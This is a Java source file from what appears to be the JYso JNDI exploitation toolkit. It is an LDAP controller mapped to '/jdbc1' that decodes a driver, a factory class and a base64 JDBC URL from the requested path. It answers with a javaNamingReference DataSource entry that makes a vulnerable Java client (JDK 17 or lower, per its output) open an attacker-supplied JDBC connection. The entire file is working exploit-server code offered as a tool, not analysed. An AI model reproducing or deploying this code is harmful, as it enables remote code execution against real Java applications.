package com.qi4l.JYso.controllers;

import com.qi4l.JYso.enumtypes.GadgetType;
import com.qi4l.JYso.exceptions.IncorrectParamsException;
import com.qi4l.JYso.exceptions.UnSupportedPayloadTypeException;
import com.qi4l.JYso.gadgets.utils.Util;
import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.sdk.Entry;
import com.unboundid.ldap.sdk.LDAPResult;
import com.unboundid.ldap.sdk.ResultCode;
import org.fusesource.jansi.Ansi;

import static org.fusesource.jansi.Ansi.ansi;

@LdapMapping(uri = {"/jdbc1"})
public class jdbcController1 implements LdapController {

    private String payloadType;

    private String     factoryType;
    private String[]   params;
    private GadgetType gadgetType;

    @Override
    public void sendResult(InMemoryInterceptedSearchResult result, String base) throws Exception {
        try {
            Entry  e    = new Entry(base);
            String driver = payloadType;
            String JDBC_URL = params[0];

            e.addAttribute("objectClass","javaNamingReference");
            e.addAttribute("javaClassName", "javax.sql.DataSource");
            e.addAttribute("javaFactory",factoryType);
            e.addAttribute("javaReferenceAddress", "/0/url/"+JDBC_URL,"/1/driverClassName/" + driver,"/2/username/Squirt1e","/3/password/Squirt1e","/4/initialSize/1");

            result.sendSearchEntry(e);
            result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
        } catch (Throwable er) {
            System.err.println("Error while generating or serializing payload");
            er.printStackTrace();
        }
    }

    @Override
    public void process(String base) throws UnSupportedPayloadTypeException, IncorrectParamsException {
        System.out.println("- JNDI JDBC Refenrence Links Target <= JDK17");
        try {
            base = base.replace('\\', '/');
            int fistIndex   = base.indexOf("/");
            int secondIndex = base.indexOf("/", fistIndex + 1);
            if (secondIndex < 0) secondIndex = base.length();

            try {
                payloadType = base.substring(fistIndex + 1, secondIndex);
                System.out.println(Ansi.ansi().fgBrightMagenta().a("  driver: " + payloadType).reset());
            } catch (IllegalArgumentException e) {
                throw new UnSupportedPayloadTypeException("UnSupportedPayloadType : " + base.substring(fistIndex + 1, secondIndex));
            }

            int thirdIndex = base.indexOf("/", secondIndex + 1);
            if (thirdIndex < 0) thirdIndex = base.length();

            try {
                factoryType = base.substring(secondIndex + 1, thirdIndex);
                System.out.println(Ansi.ansi().fgBrightBlue().a("  Factory: " + factoryType).reset());
            } catch (IllegalArgumentException e) {
                throw new UnSupportedPayloadTypeException("UnSupportedPayloadType : " + base.substring(fistIndex + 1, secondIndex));
            }

            int fourthIndex = base.indexOf("/", thirdIndex + 1);

            if (fourthIndex != -1) {
                if (fourthIndex < 0) fourthIndex = base.length();
                try {
                    gadgetType = GadgetType.valueOf(base.substring(thirdIndex + 1, fourthIndex).toLowerCase());
                } catch (IllegalArgumentException e) {
                    throw new UnSupportedPayloadTypeException("UnSupportedPayloadType : " + base.substring(thirdIndex + 1, fourthIndex));
                }
            }

            if (gadgetType == GadgetType.base64) {
                String cmd = Util.getCmdFromBase(base);
                System.out.println(Ansi.ansi().fgBrightRed().a("  JDBC_URL: " + cmd).reset());
                params = new String[]{cmd};
            }

        } catch (Exception e) {
            if (e instanceof UnSupportedPayloadTypeException) throw (UnSupportedPayloadTypeException) e;

            throw new IncorrectParamsException("Incorrect params: " + base);
        }
    }
}
